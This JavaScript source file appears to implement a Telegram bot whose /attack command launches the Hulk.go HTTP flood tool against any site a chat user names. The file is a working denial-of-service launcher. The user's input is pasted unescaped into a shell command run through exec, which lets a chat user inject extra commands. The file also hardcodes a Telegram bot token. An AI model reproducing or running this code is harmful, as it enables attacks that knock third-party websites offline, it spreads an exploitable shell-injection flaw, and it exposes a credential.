const Eris = require("eris");
const keep_alive = require('./keep_alive.js')
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Telegram bot token
const token = '6744405305:AAEh03d9Vzt2WYQIYsIHfkhaqb5Su8Dq72o';

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Listen for the /attack command
bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const site = match[1];
    
    // Execute the go run Hulk.go command
    exec(`go run Hulk.go -site ${site} -data GET`, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `Error: ${error.message}`);
            return;
        }
        if (stderr) {
            bot.sendMessage(chatId, `Error: ${stderr}`);
            return;
        }
        bot.sendMessage(chatId, `Output: ${stdout}`);
    });
});
